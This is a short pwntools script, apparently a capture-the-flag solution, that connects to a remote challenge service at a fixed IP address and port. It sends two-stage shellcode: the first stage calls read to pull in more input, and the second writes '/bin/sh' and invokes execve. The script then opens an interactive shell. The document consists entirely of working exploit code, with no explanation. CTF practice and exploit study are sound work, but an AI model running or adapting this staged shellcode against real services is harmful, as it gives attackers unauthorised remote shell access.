from pwn import *
context.binary = exe =ELF("./pwn1")
#p = process(exe.path)
#p = remote("0",1337)

p = remote("103.162.14.116",12001)
phase1 = asm(
    '''
    xchg eax,esi
    xor edi,edi 
    xor al,al
    xor edx,esi
    syscall
    '''
)

phase2 = b"/bin/sh\x00".ljust(len(phase1),b"\x00")
phase2 += asm(
    '''
    mov rdi,rsi
    xor rdx,rdx 
    xor rsi,rsi 
    mov rax,0x3b
    syscall 
    '''
)
p.sendline(phase1)
sleep(1)
p.sendline(phase2)
p.interactive()